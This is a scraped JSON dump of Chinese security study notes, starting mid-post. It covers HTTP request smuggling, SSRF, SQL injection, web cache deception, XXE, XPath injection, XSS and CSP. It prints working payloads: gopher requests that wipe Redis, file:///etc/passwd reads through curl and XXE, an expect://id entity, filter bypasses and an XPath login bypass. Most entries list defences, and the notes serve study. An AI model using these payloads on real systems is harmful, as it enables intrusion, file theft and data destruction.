攻击cl不为0的GET请求当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 Content-Length 头，不进行处理。例如下面这个例子： 1234567GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 44\\r\\nGET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。 CL-CL根据RFC 7230，当服务器收到的请求中包含两个 Content-Length ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 Content-Length 值时，就会出现漏洞。例如： 1234567POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na 这个例子中a就会被带入下一个请求，变为 aGET / HTTP/1.1\\r\\n 。 CL-TECL-TE指前端服务器处理 Content-Length 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 Content-Length ，处理 Transfer-Encoding 。例如： 12345678910POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Connection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\na 这个例子中a同样会被带入下一个请求，变为 aGET / HTTP/1.1\\r\\n 。 TE-CLTE-CL指前端服务器处理 Transfer-Encoding 请求头，而后端服务器处理 Content-Length 请求头。例如： 1234567891011POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n12\\r\\naPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n TE-TETE-TE指前后端服务器都处理 Transfer-Encoding 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 Transfer-encoding ，测试例如： 123456789101112131415POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Content-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: cow\\r\\n\\r\\n5c\\r\\naPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 防御 禁用后端连接重用 确保连接中的所有服务器具有相同的配置 拒绝有二义性的请求","categories":[],"tags":[]},{"title":"ssrf","slug":"ssrf","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:38.281Z","comments":true,"path":"2023/12/26/ssrf/","link":"","permalink":"http://example.com/2023/12/26/ssrf/","excerpt":"","text":"SSRF[TOC] 简介服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。 漏洞危害SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。 内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。 利用方式SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。 以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下： 1234567curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;curl -vvv &#x27;file:///etc/passwd&#x27;# * 注意: 链接使用单引号，避免$变量问题curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a% 相关危险函数SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() &#x2F; fsockopen() &#x2F; curl_exec() 等。 过滤绕过更改IP地址写法一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式： ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;3&#125;$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$ 对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成： 8进制格式：0300.0250.0.1 16进制格式：0xC0.0xA8.0.1 10进制整数格式：3232235521 16进制整数格式：0xC0A80001 合并后两位：1.1.278 &#x2F; 1.1.755 合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267 另外IP中的每一位，各个进制可以混用。 访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。 另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。 使用解析到内网的域名如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。 另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。 利用解析URL所出现的问题在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。 比如 http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。 利用跳转如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。 可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。 常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。 . 通过各种非HTTP协议如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。 比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL： 1gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d% 除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 file:///d:/1.txt 来访问D盘中1.txt的内容。 DNS Rebinding一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。 但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。 要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为： 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP 对于获得的IP进行判断，发现为非黑名单IP，则通过验证 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。 由于已经绕过验证，所以服务器端返回访问内网资源的结果。 利用IPv6有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤。 利用IDN一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。 在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。 可能的利用点4.4.5.1. 内网服务 Apache Hadoop远程命令执行 axis2-admin部署Server命令执行 Confluence SSRF counchdb WEB API远程命令执行 dict docker API远程命令执行 Elasticsearch引擎Groovy脚本命令执行 ftp &#x2F; ftps（FTP爆破） glassfish任意文件读取和war文件部署间接命令执行 gopher HFS远程命令执行 http、https imap&#x2F;imaps&#x2F;pop3&#x2F;pop3s&#x2F;smtp&#x2F;smtps（爆破邮件用户名密码） Java调试接口命令执行 JBOSS远程Invoker war命令执行 Jenkins Scripts接口命令执行 ldap mongodb php_fpm&#x2F;fastcgi 命令执行 rtsp - smb&#x2F;smbs（连接SMB） sftp ShellShock 命令执行 Struts2 命令执行 telnet tftp（UDP协议扩展） tomcat命令执行 WebDav PUT上传任意文件 WebSphere Admin可部署war间接命令执行 zentoPMS远程命令执行 Redis利用 写ssh公钥 写crontab 写WebShell Windows写启动项 主从复制加载 .so 文件 主从复制写无损文件 云主机在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。 防御方式 过滤返回的信息 统一错误信息 限制请求的端口 禁止不常用的协议 对DNS Rebinding，考虑使用DNS缓存或者Host白名单","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入详解笔记","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:49:04.772Z","comments":true,"path":"2023/12/26/sql注入详解笔记/","link":"","permalink":"http://example.com/2023/12/26/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3%E7%AC%94%E8%AE%B0/","excerpt":"","text":"sql注入 [TOC] 判断注入点1.字符型12345id=1&#x27; and 1 = 1--+id=1&#x27; and 1 = 2--+如果不正常回显说明存在该注入点 2.数字型12id=1 and 1 = 1--+id=1 and 1 = 2--+ 判断字符段数量123456789id=1&#x27; order by 3 --+id=1&#x27; order by 4 --+order by order by 字段名 -- 这是常规用法 order by int -- 这是数字替代了字段的位置。所以因此可以判断有几个字段 不正常回显。说明语句错误。说明不存在那么多的字段数 sql注释代码123456-- 单行注释 --与注释内容必须用空格隔开才有效--这样就不行--+某原因 +成为空格/* 多行注释*/ SQL UNION 操作符12345678-- 用来合并多个select查询语句的结果集/*UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。*/SELECT column_name(s) FROM table1UNIONSELECT column_name(s) FROM table2; 1234567891011121314151617181920212223-- 演示mysql&gt; SELECT * FROM Websites;+----+--------------+---------------------------+-------+---------+| id | name | url | alexa | country |+----+--------------+---------------------------+-------+---------+| 1 | Google | https://www.google.cm/ | 1 | USA || 2 | 淘宝 | https://www.taobao.com/ | 13 | CN || 3 | 菜鸟教程 | http://www.runoob.com/ | 4689 | CN || 4 | 微博 | http://weibo.com/ | 20 | CN || 5 | Facebook | https://www.facebook.com/ | 3 | USA || 7 | stackoverflow | http://stackoverflow.com/ | 0 | IND |+----+---------------+---------------------------+-------+---------+mysql&gt; SELECT * FROM apps;+----+------------+-------------------------+---------+| id | app_name | url | country |+----+------------+-------------------------+---------+| 1 | QQ APP | http://im.qq.com/ | CN || 2 | 微博 APP | http://weibo.com/ | CN || 3 | 淘宝 APP | https://www.taobao.com/ | CN |+----+------------+-------------------------+---------+3 rows in set (0.00 sec) sql函数123456DATABASE 查看数据库CURRENT_USER 返回服务器用来验证当前客户端的 MySQL 帐户的用户名和主机名SESSION_USER 返回当前 MySQL 用户名和主机名SYSTEM_USER 返回当前 MySQL 用户名和主机名VERSION 返回 MySQL 数据库的当前版本USER 返回当前 MySQL 用户名和主机名","categories":[],"tags":[]},{"title":"webcache欺骗攻击","slug":"web cahe欺骗攻击","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:31.991Z","comments":true,"path":"2023/12/26/web cahe欺骗攻击/","link":"","permalink":"http://example.com/2023/12/26/web%20cahe%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/","excerpt":"","text":"Web Cache欺骗攻击简介网站通常都会通过如CDN、负载均衡器、或者反向代理来实现Web缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。 例如，网站 htttp://www.example.com 配置了反向代理。对于那些包含用户个人信息的页面，如 http://www.example.com/home.php ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如css文件、js文件、txt文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略HTTP缓存头。 Web cache攻击类似于RPO相对路径重写攻击，都依赖于浏览器与服务器对URL的解析方式。当访问不存在的URL时，如 http://www.example.com/home.php/non-existent.css ，浏览器发送get请求，依赖于使用的技术与配置，服务器返回了页面 http://www.example.com/home.php 的内容，同时URL地址仍然是 http://www.example.com/home.php/non-existent.css，http头的内容也与直接访问 http://www.example.com/home.php 相同，cacheing header、content-type（此处为text&#x2F;html）也相同。 漏洞成因当代理服务器设置为缓存静态文件并忽略这类文件的caching header时，访问 http://www.example.com/home.php/no-existent.css 时，会发生什么呢？整个响应流程如下： 浏览器请求 http://www.example.com/home.php/no-existent.css ; 服务器返回 http://www.example.com/home.php 的内容(通常来说不会缓存该页面); 响应经过代理服务器; 代理识别该文件有css后缀; 在缓存目录下，代理服务器创建目录 home.php ，将返回的内容作为 non-existent.css 保存。 . 漏洞利用攻击者欺骗用户访问 http://www.example.com/home.php/logo.png?www.myhack58.com ,导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含session标识、安全问题的答案，或者csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。 漏洞存在的条件漏洞要存在，至少需要满足下面两个条件： web cache功能根据扩展进行保存，并忽略caching header; 当访问如 http://www.example.com/home.php/non-existent.css 不存在的页面，会返回 home.php 的内容。 漏洞防御防御措施主要包括3点： 设置缓存机制，仅仅缓存http caching header允许的文件，这能从根本上杜绝该问题; 如果缓存组件提供选项，设置为根据content-type进行缓存; 访问 http://www.example.com/home.php/non-existent.css 这类不存在页面，不返回 home.php 的内容，而返回404或者302。 Web Cache欺骗攻击实例PaypalPaypal在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后4位数、交易数据、emaill地址等信息。 受该攻击的部分页面包括： https://www.paypal.com/myaccount/home/attack.css https://www.paypal.com/myaccount/settings/notifications/attack.css https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details 。","categories":[],"tags":[]},{"title":"xxe","slug":"xee","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:25.113Z","comments":true,"path":"2023/12/26/xee/","link":"","permalink":"http://example.com/2023/12/26/xee/","excerpt":"","text":"XXE [TOC] XML基础XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。 基本语法XML 文档在开头有 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。 除了可选的开头外，XML 语法主要有以下的特性： 所有 XML 元素都须有关闭标签 XML 标签对大小写敏感 XML 必须正确地嵌套 XML 文档必须有根元素 XML 的属性值需要加引号 另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。 XXE当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。 攻击方式拒绝服务攻击1234567&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt; 若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。 文件读取123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt; SSRF12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;/data&gt; RCE12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; XInclude12&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/da","categories":[],"tags":[]},{"title":"xpath注入","slug":"xpath","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:13.161Z","comments":true,"path":"2023/12/26/xpath/","link":"","permalink":"http://example.com/2023/12/26/xpath/","excerpt":"","text":"Xpath注入 [TOC] Xpath定义XPath注入攻击是指利用XPath解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。 Xpath注入攻击原理 XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。 在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问， 例存在user.xml文件如下： 12345678910111213&lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; 则在XPath中其典型的查询语句为： //users/user[loginID/text()=&#39;xyz&#39;and password/text()=&#39;123test&#39;] 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = &#39;xyz&#39; 和 password = &#39;123test&#39; ，则该查询语句将返回 true。但如果用户传入类似 &#39; or 1=1 or &#39;&#39;=&#39; 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：//users/user[loginID/text()=&#39;&#39;or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39;] 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。","categories":[],"tags":[]},{"title":"xss","slug":"xss","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:18.773Z","comments":true,"path":"2023/12/26/xss/","link":"","permalink":"http://example.com/2023/12/26/xss/","excerpt":"","text":"xss [TOC] xss分类1.反射型XSS1234567反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;;?&gt; ，那么在访问时设置 /?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt; ， 则可执行预设好的JavaScript代码。反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。 2.储存型xss1储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。 3.dom xss123456789101112131415161718192021DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。例如：&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123; var str = document.getElementById(&quot;input&quot;).value; document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27;&gt;&lt;/img&gt;&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;xsstest()&quot; /&gt;&lt;/body&gt;&lt;/html&gt; 4.Blind XSSBlind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。 xss作用存在XSS漏洞时，可能会导致以下几种情况： 用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 攻击者能够在一定限度内记录用户的键盘输入。 攻击者通过CSRF等方式以用户身份执行危险操作。 XSS蠕虫。 获取用户浏览器信息。 利用XSS漏洞扫描用户内网。 同源策略简介同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。 file域的同源策略在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。 从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。 cookie的同源策略cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。 不管使用哪个协议(HTTP&#x2F;HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 domain &#x2F; path &#x2F; secure 和 http-only 标记来限定其访问性。 所以 https://localhost:8080/ 和 http://localhost:8081/ 的Cookie是共享的。 Flash&#x2F;SilverLight跨域浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。 客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。 源的更改同源策略认为域和子域属于不同的域，例如 child1.a.com 与 a.com &#x2F; child1.a.com 与 child2.a.com &#x2F; xxx.child1.a.com 与 child1.a.com 两两不同源。 对于这种情况，可以在两个方面各自设置 document.domain=&#39;a.com&#39; 来改变其源来实现以上任意两个页面之间的通信。 另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 null 。 跨源访问同源策略控制了不同源之间的交互，这些交互通常分为三类： 通常允许跨域写操作(Cross-origin writes) 链接(links)重定向表单提交 通常允许跨域资源嵌入(Cross-origin embedding) 通常不允许跨域读操作(Cross-origin reads) 可能嵌入跨源的资源的一些示例有： &lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。 &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。 &lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt; 嵌入多媒体资源。 &lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件。 @font-face 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。 &lt;frame&gt; 和 &lt;iframe&gt; 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 JSONP跨域JSONP就是利用 &lt;script&gt; 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。 服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。 JSONP也存在一些安全问题，例如当对传入&#x2F;传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。 另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。 跨源脚本API访问Javascript的APIs中，如 iframe.contentWindow , window.parent, window.open 和 window.opener 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 window 和 location 对象的访问添加限制。 window 允许跨源访问的方法有 window.blur window.close window.focus window.postMessage window 允许跨源访问的属性有 window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window 其中 window.location 允许读&#x2F;写，其他的属性只允许读 跨源数据存储访问存储在浏览器中的数据，如 localStorage 和 IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。 CORSCORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。 常见请求头 Origin 预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段Origin: &lt;origin&gt; Access-Control-Request-Method 声明请求使用的方法Access-Control-Request-Method: &lt;method&gt; Access-Control-Request-Headers 声明请求使用的header字段Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* 常见返回头 Access-Control-Allow-Origin 声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 *``Access-Control-Allow-Origin: &lt;origin&gt; | * Access-Control-Expose-Headers 声明允许暴露的头e.g. Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header Access-Control-Max-Age 声明Cache时间Access-Control-Max-Age: &lt;delta-seconds&gt; Access-Control-Allow-Credentials 声明是否允许在请求中带入Access-Control-Allow-Credentials: true Access-Control-Allow-Methods 声明允许的访问方式Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]* Access-Control-Allow-Headers 声明允许的头Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* 阻止跨源访问阻止跨域写操作，可以检测请求中的 CSRF token ，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。 阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 Content-Type 消息头。例如如果在HTML文档中指定 &lt;script&gt; 标记，则浏览器会尝试将HTML解析为JavaScript。 cspContent Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。 配置CSP策略可以通过 HTTP 头信息或者 meta 元素定义。 CSP 有三类： Content-Security-Policy (Google Chrome) X-Content-Security-Policy (Firefox) X-WebKit-CSP (WebKit-based browsers, e.g. Safari) 123HTTP header :&quot;Content-Security-Policy:&quot; 策略&quot;Content-Security-Policy-Report-Only:&quot; 策略 HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。 HTML Meta : 12&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt; 指令说明 指令 说明 default-src 定义资源默认加载策略 connect-src 定义 Ajax、WebSocket 等加载策略 font-src 定义 Font 加载策略 frame-src 定义 Frame 加载策略 img-src 定义图片加载策略 media-src 定义 、 等引用资源加载策略 object-src 定义 、、 等引用资源加载策略 script-src 定义 JS 加载策略 style-src 定义 CSS 加载策略 base-uri 定义 根URL策略，不使用default-src作为默认值 sandbox 值为 allow-forms，对资源启用 sandbox report-uri 值为 &#x2F;report-uri，提交日志 4.2.4.2.2. 关键字 - 允许从任意url加载，除了 data: blob: filesystem: schemese.g. img-src - none 禁止从任何url加载资源e.g. object-src &#39;none&#39; self 只可以加载同源资源e.g. img-src &#39;self&#39; data: 可以通过data协议加载资源e.g. img-src &#39;self&#39; data: domain.example.com e.g. img-src domain.example.com只可以从特定的域加载资源 \\*.example.com e.g. img-src \\*.example.com可以从任意example.com的子域处加载资源 https://cdn.com e.g. img-src https://cdn.com只能从给定的域用https加载资源 https: e.g. img-src https:只能从任意域用https加载资源 unsafe-inline 允许内部资源执行代码例如style attribute,onclick或者是sicript标签e.g. script-src &#39;unsafe-inline&#39; unsafe-eval 允许一些不安全的代码执行方式，例如js的eval()e.g. script-src &#39;unsafe-eval&#39; 